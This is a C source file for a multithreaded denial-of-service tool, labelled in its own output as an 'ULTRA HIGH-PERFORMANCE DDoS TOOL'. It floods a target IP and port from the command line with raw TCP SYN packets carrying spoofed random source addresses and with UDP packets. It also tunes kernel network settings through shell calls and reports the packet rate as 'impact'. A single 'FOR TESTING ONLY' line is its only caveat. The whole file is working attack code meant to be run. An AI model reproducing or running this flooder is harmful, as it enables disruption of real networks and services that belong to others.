#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/time.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sched.h>

#define CPU_CORES 8
#define TARGET_PPS 850000
#define BATCH_SIZE 1000

/* Global counters */
volatile long long total_packets = 0;
volatile long long total_bytes = 0;
volatile int attack_running = 1;

/* Packet buffer */
char* packet_buffer;
int packet_sizes[10];

typedef struct {
    int core_id;
    char target_ip[16];
    int target_port;
    long long packets_sent;
    long long bytes_sent;
    int raw_sock;
    int udp_sock;
} core_data_t;

/* Simple IP header */
struct simple_ip {
    unsigned char version_ihl;
    unsigned char tos;
    unsigned short tot_len;
    unsigned short id;
    unsigned short frag_off;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short check;
    unsigned int saddr;
    unsigned int daddr;
};

/* Simple TCP header */
struct simple_tcp {
    unsigned short source;
    unsigned short dest;
    unsigned int seq;
    unsigned int ack_seq;
    unsigned short flags;
    unsigned short window;
    unsigned short check;
    unsigned short urg_ptr;
};

/* Fast checksum */
unsigned short checksum(void* b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2) {
        sum += *buf++;
    }

    if (len == 1) {
        sum += *(unsigned char*)buf << 8;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    result = ~sum;
    return result;
}

/* Initialize packet templates */
void init_packet_templates(const char* target_ip, int target_port) {
    packet_buffer = malloc(10240);
    if (!packet_buffer) {
        printf("Failed to allocate packet buffer\n");
        exit(1);
    }

    for (int i = 0; i < 10; i++) {
        char* packet = packet_buffer + (i * 1024);
        
        struct simple_ip* ip = (struct simple_ip*)packet;
        struct simple_tcp* tcp = (struct simple_tcp*)(packet + sizeof(struct simple_ip));
        
        /* IP Header */
        ip->version_ihl = 0x45;
        ip->tos = 0;
        ip->tot_len = htons(sizeof(struct simple_ip) + sizeof(struct simple_tcp));
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 64;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = rand();
        inet_pton(AF_INET, target_ip, &ip->daddr);
        
        /* TCP Header */
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(target_port);
        tcp->seq = rand();
        tcp->ack_seq = 0;
        tcp->flags = htons(0x5002); /* SYN flag */
        tcp->window = htons(8192);
        tcp->check = 0;
        tcp->urg_ptr = 0;
        
        /* Calculate checksum */
        ip->check = checksum(ip, sizeof(struct simple_ip));
        
        packet_sizes[i] = sizeof(struct simple_ip) + sizeof(struct simple_tcp);
    }
}

/* High-speed attack thread */
void* core_attack_thread(void* arg) {
    core_data_t* data = (core_data_t*)arg;
    
    printf("🔥 Core %d: Starting attack\n", data->core_id);
    
    /* Create raw socket */
    data->raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (data->raw_sock < 0) {
        printf("❌ Core %d: Cannot create raw socket (need root)\n", data->core_id);
        /* Fallback to UDP */
        data->raw_sock = -1;
    } else {
        int one = 1;
        setsockopt(data->raw_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    }
    
    /* Create UDP socket */
    data->udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (data->udp_sock < 0) {
        printf("❌ Core %d: Cannot create UDP socket\n", data->core_id);
        return NULL;
    }
    
    /* Set socket buffers */
    int buffer_size = 65536;
    setsockopt(data->udp_sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));
    
    struct sockaddr_in target_addr;
    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(data->target_port);
    inet_pton(AF_INET, data->target_ip, &target_addr.sin_addr);
    
    /* UDP payload */
    char udp_payload[1400];
    memset(udp_payload, 'A' + data->core_id, sizeof(udp_payload));
    
    printf("✅ Core %d: Ready\n", data->core_id);
    
    while (attack_running) {
        /* Raw TCP SYN flood */
        if (data->raw_sock > 0) {
            for (int i = 0; i < BATCH_SIZE / 2; i++) {
                int pkt_idx = rand() % 10;
                char* packet = packet_buffer + (pkt_idx * 1024);
                
                /* Randomize source */
                struct simple_ip* ip = (struct simple_ip*)packet;
                struct simple_tcp* tcp = (struct simple_tcp*)(packet + sizeof(struct simple_ip));
                
                ip->saddr = rand();
                ip->id = htons(rand() % 65535);
                tcp->source = htons(rand() % 65535);
                tcp->seq = rand();
                
                ip->check = 0;
                ip->check = checksum(ip, sizeof(struct simple_ip));
                
                int sent = sendto(data->raw_sock, packet, packet_sizes[pkt_idx], 
                                MSG_DONTWAIT, (struct sockaddr*)&target_addr, sizeof(target_addr));
                
                if (sent > 0) {
                    data->packets_sent++;
                    data->bytes_sent += sent;
                    __sync_fetch_and_add(&total_packets, 1);
                    __sync_fetch_and_add(&total_bytes, sent);
                }
            }
        }
        
        /* UDP flood */
        for (int i = 0; i < BATCH_SIZE / 2; i++) {
            int payload_size = 64 + (rand() % 1336); /* 64-1400 bytes */
            
            int sent = sendto(data->udp_sock, udp_payload, payload_size, 
                            MSG_DONTWAIT, (struct sockaddr*)&target_addr, sizeof(target_addr));
            
            if (sent > 0) {
                data->packets_sent++;
                data->bytes_sent += sent;
                __sync_fetch_and_add(&total_packets, 1);
                __sync_fetch_and_add(&total_bytes, sent);
            }
        }
        
        /* Small delay to prevent CPU overload */
        usleep(100);
    }
    
    if (data->raw_sock > 0) close(data->raw_sock);
    if (data->udp_sock > 0) close(data->udp_sock);
    return NULL;
}

/* Statistics thread */
void* stats_thread(void* arg) {
    time_t start_time = time(NULL);
    long long last_packets = 0;
    
    while (attack_running) {
        sleep(1);
        
        time_t current_time = time(NULL);
        int elapsed = current_time - start_time;
        
        long long current_packets = total_packets;
        long long current_bytes = total_bytes;
        
        long long pps = current_packets - last_packets;
        float avg_pps = elapsed > 0 ? (float)current_packets / elapsed : 0;
        float mbps = (float)(current_bytes - total_bytes) / 1024 / 1024;
        
        printf("\r🔥 PPS: %7lld | Avg: %8.0f | Total: %10lld | %ds", 
               pps, avg_pps, current_packets, elapsed);
        
        if (pps >= TARGET_PPS * 0.8) {
            printf(" ✅ HIGH IMPACT!");
        } else if (pps >= TARGET_PPS * 0.5) {
            printf(" ⚡ GOOD IMPACT");
        } else {
            printf(" 🚀 RAMPING UP");
        }
        
        fflush(stdout);
        last_packets = current_packets;
    }
    
    return NULL;
}

void signal_handler(int sig) {
    printf("\n\n🛑 Stopping attack...\n");
    attack_running = 0;
}

/* System optimization */
void optimize_system() {
    printf("🔧 Optimizing system...\n");
    
    /* Ignore errors */
    system("echo 16777216 > /proc/sys/net/core/rmem_max 2>/dev/null || true");
    system("echo 16777216 > /proc/sys/net/core/wmem_max 2>/dev/null || true");
    system("echo 32768 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null || true");
    system("echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse 2>/dev/null || true");
    system("echo 0 > /proc/sys/net/ipv4/tcp_timestamps 2>/dev/null || true");
    system("echo 1048576 > /proc/sys/fs/file-max 2>/dev/null || true");
    
    printf("✅ System optimization completed\n");
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        printf("Example: %s 192.168.1.100 80\n", argv[0]);
        return 1;
    }
    
    char target_ip[16];
    int target_port = atoi(argv[2]);
    strncpy(target_ip, argv[1], sizeof(target_ip) - 1);
    
    printf("🚀 ULTRA HIGH-PERFORMANCE DDoS TOOL\n");
    printf("🎯 Target: %s:%d\n", target_ip, target_port);
    printf("⚡ Target PPS: %d\n", TARGET_PPS);
    printf("🧠 CPU Cores: %d\n", CPU_CORES);
    
    if (getuid() == 0) {
        printf("✅ Running as root - raw sockets enabled\n");
    } else {
        printf("⚠️  Running as user - UDP only mode\n");
    }
    
    printf("⚠️  FOR TESTING ONLY!\n\n");
    
    /* System optimization */
    optimize_system();
    
    /* Initialize */
    srand(time(NULL));
    init_packet_templates(target_ip, target_port);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    /* Create threads */
    pthread_t threads[CPU_CORES];
    core_data_t core_data[CPU_CORES];
    
    for (int i = 0; i < CPU_CORES; i++) {
        core_data[i].core_id = i;
        strcpy(core_data[i].target_ip, target_ip);
        core_data[i].target_port = target_port;
        core_data[i].packets_sent = 0;
        core_data[i].bytes_sent = 0;
        
        if (pthread_create(&threads[i], NULL, core_attack_thread, &core_data[i]) != 0) {
            printf("❌ Failed to create thread %d\n", i);
        }
    }
    
    /* Statistics thread */
    pthread_t stats_tid;
    pthread_create(&stats_tid, NULL, stats_thread, NULL);
    
    printf("🔥 ATTACK LAUNCHED!\n");
    printf("📊 %d threads running\n", CPU_CORES);
    printf("Press Ctrl+C to stop\n\n");
    
    /* Wait for threads */
    for (int i = 0; i < CPU_CORES; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(stats_tid, NULL);
    
    /* Final stats */
    printf("\n\n✅ ATTACK COMPLETED\n");
    printf("📊 Total packets: %lld\n", total_packets);
    printf("📊 Total data: %.2f MB\n", (float)total_bytes / 1024 / 1024);
    
    free(packet_buffer);
    return 0;
}
